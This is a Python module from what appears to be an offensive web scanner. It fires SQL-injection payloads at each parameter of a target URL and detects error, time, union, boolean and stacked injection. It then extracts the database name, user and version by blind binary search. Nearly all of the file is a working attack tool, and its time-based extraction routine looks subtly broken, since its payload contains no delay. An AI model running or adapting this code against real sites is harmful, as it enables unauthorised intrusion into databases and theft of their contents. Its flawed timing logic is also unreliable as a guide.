"""sqli v8 — sniper: 40 curated payloads with DBMS/type/bypass metadata"""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.sniper_payloads import SNIPER_SQLI, GROUPS


ERROR_MARKERS = [
    # MySQL
    "sql syntax", "mysql_fetch", "mysqli", "warning: mysql", "mysql_num_rows",
    "xpath syntax", "double value out of range", "extractvalue", "updatexml",
    "you have an error in your sql",
    # PostgreSQL
    "pg_query", "pg_exec", "postgresql", "invalid input syntax for integer",
    "unterminated quoted string",
    # MSSQL
    "microsoft ole db", "odbc sql", "conversion failed", "unclosed quotation",
    # Oracle
    "ora-", "ora-01756", "ora-00933", "oracle", "utl_inaddr", "utl_http",
    # SQLite
    "sqlite3", "sqlite_", "sqlstate",
    # Generic
    "sql command not properly ended", "division by zero", "invalid query",
    "quoted string not properly terminated",
]

# Simple payloads для baseline check (не из sniper)
BASELINE_PROBES = [
    ("error_basic_single", "'", "error"),
    ("error_basic_double", '"', "error"),
    ("error_basic_paren",  "')", "error"),
]


class Sqli:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}
        http = HttpClient(session, logger)

        # baseline
        base = http.get(target)
        if not base:
            print("[sqli] no baseline")
            return {}
        base_len = len(base.content)
        base_time = self._baseline_time(http, target, samples=3)

        print(f"[sqli v8] sniper mode")
        print(f"[sqli v8] target: {target}")
        print(f"[sqli v8] baseline: {base.status_code} {base_len}b avg={base_time:.2f}s")
        print(f"[sqli v8] params: {list(params.keys())}")
        print(f"[sqli v8] sniper probes: {len(SNIPER_SQLI)}")
        print(f"[sqli v8] groups: error={len(GROUPS['error_mysql'])+len(GROUPS['error_other'])}, "
              f"time={len(GROUPS['time'])}, union={len(GROUPS['union'])}, "
              f"boolean={len(GROUPS['boolean'])}, stacked={len(GROUPS['stacked'])}, "
              f"oob={len(GROUPS['oob'])}")
        print()

        findings = []
        vuln_param = None
        vuln_type = None

        for name in params:
            print(f"[param: {name}]")

            # ===== Phase 1: baseline probes (basic quotes) =====
            for pname, payload, ptype in BASELINE_PROBES:
                r = http.get(self._url(u, params, name, payload))
                if not r:
                    continue
                low = r.text.lower()
                for m in ERROR_MARKERS:
                    if m in low:
                        print(f"  ✓ [{pname}] ERROR → {m}")
                        findings.append({"param": name, "name": pname,
                                         "payload": payload, "type": "error",
                                         "marker": m})
                        logger.finding("sqli_error", "high",
                                       f"{name}={payload[:30]} marker={m}")
                        vuln_param = name
                        vuln_type = "error"
                        break

            # ===== Phase 2: sniper probes =====
            print(f"  [sniper] {len(SNIPER_SQLI)} probes")
            probes_run = 0
            for probe in SNIPER_SQLI:
                probes_run += 1
                payload = probe["payload"]
                ptype = probe["type"]
                pname = probe["name"]
                bypass = ",".join(probe.get("bypass", [])[:2])

                url = self._url(u, params, name, payload)
                t0 = time.time()
                r = http.get(url)
                dt = time.time() - t0
                if not r:
                    continue

                size = len(r.content)
                low = r.text.lower()

                # --- error-based ---
                if ptype == "error":
                    for m in ERROR_MARKERS:
                        if m in low:
                            print(f"  ✓ [{pname}] ERROR → {m[:40]} (bypass: {bypass})")
                            findings.append({
                                "param": name, "name": pname, "payload": payload,
                                "type": "error", "marker": m, "dbms": probe["dbms"],
                                "bypass": probe["bypass"],
                                "unique": probe["unique"],
                            })
                            logger.finding("sqli_error", "high",
                                           f"{name} ({probe['dbms']}) {pname}: {m[:30]}")
                            vuln_param = name
                            if not vuln_type:
                                vuln_type = "error"
                            break

                # --- time-based ---
                elif ptype == "time" and dt > base_time + 2.5:
                    print(f"  ✓ [{pname}] TIME delay={dt:.2f}s (bypass: {bypass})")
                    findings.append({
                        "param": name, "name": pname, "payload": payload,
                        "type": "time", "delay": round(dt, 2),
                        "dbms": probe["dbms"], "bypass": probe["bypass"],
                        "unique": probe["unique"],
                    })
                    logger.finding("sqli_time", "high",
                                   f"{name} ({probe['dbms']}) {pname} delay={dt:.2f}s")
                    vuln_param = name
                    if not vuln_type:
                        vuln_type = "time"

                # --- union-based ---
                elif ptype == "union":
                    diff = size - base_len
                    if abs(diff) > 50:
                        print(f"  ✓ [{pname}] UNION diff={diff:+d}b (bypass: {bypass})")
                        findings.append({
                            "param": name, "name": pname, "payload": payload,
                            "type": "union", "diff": diff,
                            "dbms": probe["dbms"], "bypass": probe["bypass"],
                            "unique": probe["unique"],
                        })
                        logger.finding("sqli_union", "high",
                                       f"{name} ({probe['dbms']}) {pname} diff={diff}")
                        vuln_param = name
                        if not vuln_type:
                            vuln_type = "union"

                # --- boolean-based ---
                elif ptype == "boolean":
                    # boolean сравниваем после — парную
                    pass

                # --- stacked ---
                elif ptype == "stacked":
                    # если нет ошибки — возможно stacked работает
                    if not any(m in low for m in ERROR_MARKERS):
                        # проверка через time (для stacked pg_sleep)
                        if "sleep" in payload.lower() or "waitfor" in payload.lower():
                            if dt > base_time + 2.5:
                                print(f"  ✓ [{pname}] STACKED+TIME delay={dt:.2f}s")
                                findings.append({
                                    "param": name, "name": pname,
                                    "payload": payload, "type": "stacked_time",
                                    "delay": round(dt, 2), "dbms": probe["dbms"],
                                    "unique": probe["unique"],
                                })
                                logger.finding("sqli_stacked", "high",
                                               f"{name} {pname} delay={dt:.2f}s")
                                vuln_param = name

                # --- oob ---
                elif ptype == "oob":
                    # OOB не проверим без внешнего listener, но проверим что запрос не падает
                    if r.status_code == 200 and "sql" not in low[:200]:
                        print(f"  ~ [{pname}] OOB-possible (нужен listener)")
                        findings.append({
                            "param": name, "name": pname, "payload": payload,
                            "type": "oob_candidate", "dbms": probe["dbms"],
                            "unique": probe["unique"],
                        })

                if probes_run % 10 == 0:
                    print(f"    ... {probes_run}/{len(SNIPER_SQLI)}")

            # ===== Phase 3: boolean blind check (пары) =====
            bool_true = "' AND '1'='1"
            bool_false = "' AND '1'='2"
            r_t = http.get(self._url(u, params, name, bool_true))
            time.sleep(0.15)
            r_f = http.get(self._url(u, params, name, bool_false))
            if r_t and r_f:
                diff = abs(len(r_t.content) - len(r_f.content))
                if diff > 100:
                    print(f"  ✓ [boolean_blind] true/false diff={diff}b")
                    findings.append({
                        "param": name, "type": "boolean_blind",
                        "diff": diff, "unique": "boolean diff — основа extraction",
                    })
                    logger.finding("sqli_boolean", "high",
                                   f"{name} true/false diff={diff}")
                    vuln_param = name
                    if not vuln_type:
                        vuln_type = "boolean"

        # ===== Phase 4: blind extraction =====
        if vuln_param and vuln_type in ("boolean", "time"):
            print()
            print(f"[sqli v8] blind injection ({vuln_type}) — extracting via binary search")
            self._blind_extract(http, u, params, vuln_param, vuln_type,
                                base_len, base_time, logger)

        print()
        print(f"[sqli v8] findings: {len(findings)}")
        print(f"[sqli v8] vulnerable: {vuln_param} ({vuln_type})")
        return {"findings": findings, "param": vuln_param, "type": vuln_type}

    def _baseline_time(self, http, url, samples=3):
        times = []
        for _ in range(samples):
            t0 = time.time()
            http.get(url)
            times.append(time.time() - t0)
            time.sleep(0.15)
        return sum(times) / len(times) if times else 0.5

    def _blind_extract(self, http, u, params, param, vtype, base_len, base_time, logger):
        """Binary search extraction via boolean/time."""
        queries = [
            ("database", "database()"),
            ("user", "current_user()"),
            ("version", "version()"),
        ]
        for qname, expr in queries:
            print(f"  [{qname}] extracting...", flush=True)
            result = ""
            for pos in range(1, 33):
                c = self._binary_char(http, u, params, param, expr, pos,
                                       vtype, base_len, base_time)
                if not c or c == 0:
                    break
                result += chr(c)
                print(f"    pos {pos}: '{chr(c)}' → '{result}'")
            if result.strip():
                print(f"  ✓ {qname} = {result.strip()}")
                logger.finding("sqli_extract", "critical", f"{qname}={result.strip()}")

    def _binary_char(self, http, u, params, param, query, pos, vtype, base_len, base_time):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            url = self._url(u, params, param, payload)

            if vtype == "boolean":
                r = http.get(url)
                if not r:
                    return 0
                if abs(len(r.content) - base_len) < 100:
                    lo = mid + 1
                else:
                    hi = mid - 1
            else:  # time
                t0 = time.time()
                http.get(url)
                dt = time.time() - t0
                if dt > base_time + 2.0:
                    lo = mid + 1
                else:
                    hi = mid - 1

        return lo if 32 < lo < 127 else 0

    def _url(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
